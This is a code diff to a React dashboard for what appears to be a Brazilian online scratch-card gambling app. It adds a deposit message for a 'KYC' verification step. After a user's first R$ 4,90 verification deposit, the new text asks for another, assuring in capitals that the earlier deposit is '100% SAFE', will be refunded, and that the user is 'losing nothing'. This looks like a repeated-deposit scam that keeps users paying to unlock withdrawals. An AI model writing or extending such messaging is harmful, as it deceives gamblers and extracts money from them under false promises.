@@ -224,6 +224,26 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
     }, 300);
   };
 
+  const getDepositMessage = () => {
+    if (kycDepositAmount) {
+      const currentDepositAttempts = gameState.kycStatus?.depositAttempts || 0;
+
+      if (currentDepositAttempts === 1) {
+        // Segundo depósito - mensagem mais clara sobre reembolso
+        return `IMPORTANTE: Seu deposito anterior de R$ ${depositedAmount.toFixed(2).replace('.', ',')} esta 100% SEGURO e sera devolvido! Apos este novo deposito de R$ 4,90, voce recebera R$ ${(depositedAmount + 4.90).toFixed(2).replace('.', ',')} no total (${depositedAmount.toFixed(2).replace('.', ',')} + 4,90). Voce NAO esta perdendo nada!`;
+      }
+
+      // Primeiro depósito
+      return 'Apos verificacao, voce podera sacar todo o seu saldo disponivel. O deposito de R$ 4,90 sera creditado automaticamente.';
+    }
+
+    if (!canPlay) {
+      return `Você precisa de mais R$ ${missingAmount.toFixed(2).replace('.', ',')} para jogar a próxima rodada`;
+    }
+
+    return undefined;
+  };
+
 
 
   // Se está jogando, mostrar raspadinha
@@ -428,11 +448,7 @@ export const GameDashboard: React.FC<GameDashboardProps> = ({ user }) => {
         }}
         onAddBalance={handleAddBalance}
         suggestedAmount={kycDepositAmount || getSuggestedAmount()}
-        message={kycDepositAmount ? (
-          'Apos verificacao, voce podera sacar todo o seu saldo disponivel. O deposito de R$ 4,90 sera creditado automaticamente.'
-        ) : !canPlay ? (
-          `Você precisa de mais R$ ${missingAmount.toFixed(2).replace('.', ',')} para jogar a próxima rodada`
-        ) : undefined}
+        message={getDepositMessage()}
       />
 
       <MoneyPrizeModal
